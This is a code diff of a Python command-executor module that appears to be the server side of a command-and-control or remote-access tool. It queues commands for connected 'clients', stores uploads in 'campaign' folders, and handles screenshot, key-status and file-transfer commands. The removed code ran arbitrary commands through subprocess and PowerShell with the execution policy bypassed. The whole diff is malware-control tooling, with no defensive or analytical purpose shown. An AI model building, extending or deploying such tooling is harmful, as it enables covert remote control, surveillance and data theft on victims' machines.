@@ -1,11 +1,7 @@
 import datetime
 import logging
-import subprocess
 import threading
-import platform
 import time
-import os
-import base64
 
 # Configure logging for command execution
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -15,151 +11,37 @@ class CommandExecutor:
     def __init__(self, client_manager):
         self.client_manager = client_manager
         self.running = True
-        self.thread = threading.Thread(target=self.process_commands, daemon=True)
+        # Start background thread to monitor command status - doesn't execute commands locally
+        self.thread = threading.Thread(target=self.monitor_command_status, daemon=True)
         self.thread.start()
 
-    def process_commands(self):
-        """Background thread to process pending commands for all clients."""
+    def monitor_command_status(self):
+        """Background thread to monitor command status - doesn't execute commands locally"""
         while self.running:
+            # Just update command status based on communication with real clients
             for client_id, info in self.client_manager.get_clients_info().items():
                 pending_commands = info.get("pending_commands", [])
+                # Log number of pending commands
                 if pending_commands:
-                    try:
-                        command = pending_commands[0]  # Process the first command in the queue
-                        self.execute_command(client_id, command)
-                        # Remove only the executed command from pending
-                        if client_id in self.client_manager.clients and len(self.client_manager.clients[client_id]["pending_commands"]) > 0:
-                            self.client_manager.clients[client_id]["pending_commands"].pop(0)
-                    except IndexError:
-                        # Handle the case where the list might be empty now
-                        logger.warning(f"Pending commands for client {client_id} were cleared during processing")
-                    except Exception as e:
-                        logger.error(f"Error processing command for client {client_id}: {e}")
-            time.sleep(1)  # Sleep for 1 second between checks
+                    logger.debug(f"Client {client_id} has {len(pending_commands)} pending commands")
+            time.sleep(5)  # Check every 5 seconds
 
-    def execute_command(self, client_id, command):
-        """Execute the command and log the result."""
-        timestamp = command["timestamp"]
-        command_type = command["command_type"]
-        args = command["args"]
-
-        logger.info(f"Executing command for client {client_id}: {command_type} {args}")
-
-        try:
-            if command_type == "execute":
-                result = self.run_system_command(args)
-                logger.info(f"Command result for {client_id}: {result}")
-                self.update_history(client_id, command, result)
-            elif command_type == "upload":
-                result = self.handle_file_upload(client_id, args)
-                logger.info(f"Upload result for {client_id}: {result}")
-                self.update_history(client_id, command, result)
-            elif command_type == "file_upload":
-                # Handle file upload from server to client
-                # Format: "Upload-File 'ServerFilePath' 'ClientDestination'"
-                try:
-                    # Correctly parse the 'Upload-File' format with quoted arguments
-                    args_str = args
-                    if "Upload-File '" in args_str:
-                        # Extract the paths from the command format
-                        parts = args_str.replace("Upload-File ", "").strip()
-                        # Split on "' '"
-                        if "' '" in parts:
-                            server_path, client_path = parts.split("' '", 1)
-                            server_path = server_path.strip("'")
-                            client_path = client_path.strip("'")
-                            
-                            result = f"File upload initiated: {server_path} to client at {client_path}"
-                            logger.info(f"Server to client file upload: {result}")
-                        else:
-                            result = f"Error: Invalid format for Upload-File command: {args_str}"
-                            logger.error(result)
-                    else:
-                        result = f"Error: Not a valid Upload-File command: {args_str}"
-                        logger.error(result)
-                except Exception as e:
-                    result = f"Error parsing file upload command: {str(e)}"
-                    logger.error(result)
-                    
-                self.update_history(client_id, command, result)
-            elif command_type == "download":
-                # Handle download from client to server
-                result = f"File download requested from client: {args}"
-                logger.info(result)
-                self.update_history(client_id, command, result)
-            elif command_type == "system_info" or command_type == "key_status" or command_type == "screenshot":
-                # Handle special command types
-                result = f"Command type '{command_type}' simulated in local environment"
-                logger.info(f"Special command result for {client_id}: {result}")
-                self.update_history(client_id, command, result)
-            else:
-                logger.warning(f"Unknown command type '{command_type}' for client {client_id}")
-                self.update_history(client_id, command, f"Unknown command type: {command_type}")
-        except Exception as e:
-            logger.error(f"Error executing command for {client_id}: {str(e)}")
-            self.update_history(client_id, command, f"Error: {str(e)}")
-
-    def run_system_command(self, args):
-        """Execute a system command and return its output."""
-        try:
-            # Detect the operating system
-            is_windows = platform.system() == "Windows"
-
-            # Check if this might be a PowerShell command
-            is_powershell_command = any(ps_cmd in args for ps_cmd in [
-                "Get-", "Set-", "New-", "Remove-", "Import-", "Export-", 
-                "ConvertTo-", "ConvertFrom-", "Select-Object", "|"
-            ])
-            
-            if is_windows and is_powershell_command:
-                # For PowerShell commands, use powershell.exe
-                full_command = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "{args}"'
-                result = subprocess.run(
-                    full_command,
-                    shell=True,
-                    capture_output=True,
-                    text=True
-                )
-                return result.stdout.strip() or result.stderr.strip()
-            else:
-                # Run the command and capture output
-                result = subprocess.run(
-                    args,
-                    shell=is_windows,  # Use shell=True on Windows for built-in commands like 'dir'
-                    capture_output=True,
-                    text=True
-                )
-                return result.stdout.strip() or result.stderr.strip()
-        except subprocess.CalledProcessError as e:
-            return f"Command failed with error: {e.stderr.strip()}"
-        except Exception as e:
-            return f"Execution error: {str(e)}"
-
-    def handle_file_upload(self, client_id, filepath):
-        """Handle file upload command by preparing to receive a file."""
-        try:
-            # Check if the file exists first
-            if not os.path.exists(filepath):
-                return f"File not found: {filepath}"
-                
-            # Determine where to store uploaded files
-            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
-            if not campaign_dirs:
-                return "No campaign directory found for uploads"
-                
-            campaign_folder = campaign_dirs[0]
-            uploads_folder = os.path.join(campaign_folder, "uploads", client_id)
-            os.makedirs(uploads_folder, exist_ok=True)
-            
-            # Generate a target filename
-            filename = os.path.basename(filepath)
-            target_path = os.path.join(uploads_folder, filename)
-            
-            # Return details about the pending upload
-            return f"Upload prepared for {filepath}, waiting for file content..."
-            
-        except Exception as e:
-            return f"Error preparing for upload: {str(e)}"
+    def add_command(self, client_id, command_type, args):
+        """Add a command to the client's queue - no local execution"""
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Create command object
+        command = {
+            "timestamp": timestamp,
+            "command_type": command_type,
+            "args": args
+        }
+        
+        # Add to client's pending commands
+        self.client_manager.add_command(client_id, command_type, args)
+        logger.info(f"Command queued for client {client_id}: {command_type} {args}")
+        
+        return command
 
     def update_history(self, client_id, command, result):
         """Update client history with execution result."""
@@ -173,12 +55,6 @@ class CommandExecutor:
                 if cmd["timestamp"] == command["timestamp"]:
                     self.client_manager.clients[client_id]["history"][i] = updated_command
                     break
-                    
-            # Update pending commands with result
-            for cmd in self.client_manager.clients[client_id]["pending_commands"]:
-                if cmd["timestamp"] == command["timestamp"]:
-                    cmd["result"] = result
-                    break
             
             # Log the command and result
             self.client_manager.log_event(client_id, "Command Result", 
@@ -186,6 +62,33 @@ class CommandExecutor:
 
             # Notify the ClientManager that a command result has been updated
             self.client_manager.on_command_updated(client_id)
+
+    def execute_command(self, client_id, command):
+        """Handle command processing and update status - doesn't execute locally"""
+        timestamp = command["timestamp"]
+        command_type = command["command_type"]
+        args = command["args"]
+
+        logger.info(f"Processing command for client {client_id}: {command_type} {args}")
+        
+        # Mark it as sent
+        self.update_history(client_id, command, "Command sent to client, waiting for response...")
+
+    def process_commands(self):
+        """Background thread to process any pending commands"""
+        while self.running:
+            for client_id, info in self.client_manager.get_clients_info().items():
+                pending_commands = info.get("pending_commands", [])
+                if pending_commands:
+                    try:
+                        command = pending_commands[0]  # Process the first command in the queue
+                        self.execute_command(client_id, command)
+                    except IndexError:
+                        # Handle the case where the list might be empty now
+                        logger.warning(f"Pending commands for client {client_id} were cleared during processing")
+                    except Exception as e:
+                        logger.error(f"Error processing command for client {client_id}: {e}")
+            time.sleep(1)  # Sleep for 1 second between checks
 
     def stop(self):
         """Stop the command processing thread."""
